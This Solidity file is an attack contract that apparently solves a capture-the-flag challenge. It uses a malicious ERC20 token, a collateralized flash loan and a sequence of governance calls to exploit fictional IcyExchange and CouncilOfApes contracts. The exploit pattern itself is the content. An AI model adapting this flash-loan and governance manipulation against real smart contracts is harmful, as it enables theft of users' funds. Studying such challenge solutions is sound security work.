// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

// Importing contract dependencies.
import "./IcyExchange.sol";
import "./EvilERC20.sol";
import "./CouncilOfApes.sol";

/**
 * @title Attack
 * @dev This contract is designed to execute an attack on the IcyExchange and CouncilOfApes contracts.
 *      It involves a series of complex interactions to exploit the system.
 */
contract Attack {
    // Contract instances involved in the attack.
    IcyExchange private icyDex;
    EvilErc20 private evilErc20;
    EvilErc20 private icyToken;
    CouncilOfApes private councilApe;

    /**
     * @dev Constructor to initialize contract instances.
     * @param _icyDex Address of the IcyExchange contract.
     * @param _council Address of the CouncilOfApes contract.
     * @param _icyToken Address of the IcyToken contract.
     */
    constructor(address _icyDex, address _council, address _icyToken) payable {
        icyDex = IcyExchange(_icyDex);
        councilApe = CouncilOfApes(_council);
        icyToken = EvilErc20(_icyToken);
    }

    /**
     * @dev Initiates the attack by performing a series of interactions with the contracts.
     */
    function initAttack() public {
        // Declare the "holyWords" for the CouncilOfApes contract.
        bytes32 holyWords = keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing");
        councilApe.becomeAnApe(holyWords);

        // Deploy a new EvilERC20 token and interact with IcyExchange.
        evilErc20 = new EvilErc20(address(this), "EVIL", "EV");
        evilErc20.approve(address(icyDex), type(uint256).max);
        icyDex.createPool{value: 1 ether}(address(evilErc20));

        // Perform a collateralized flash loan.
        icyDex.collateralizedFlashloan(address(evilErc20), 1_000_000_000, address(this));
    }

    /**
     * @dev Function to be called when receiving the flash loan. Contains the core logic of the attack.
     * @param _amount The amount received in the flash loan.
     */
    function receiveFlashLoan(uint256 _amount) public {
        // Approval and interactions with the CouncilOfApes contract.
        icyToken.approve(address(councilApe), type(uint256).max);
        councilApe.buyBanana(1_000_000_000);
        councilApe.vote(address(this), 1_000_000_000);
        councilApe.claimNewRank();

        // Further interactions to manipulate the system.
        councilApe.issueBanana(1_000_000_000, address(this));
        councilApe.sellBanana(1_000_000_000);
        councilApe.dissolveCouncilOfTheApes(keccak256("Kevin come out of the basement, dinner is ready."));

        // Approval for IcyToken in the IcyExchange.
        icyToken.approve(address(icyDex), type(uint256).max);
    }
}
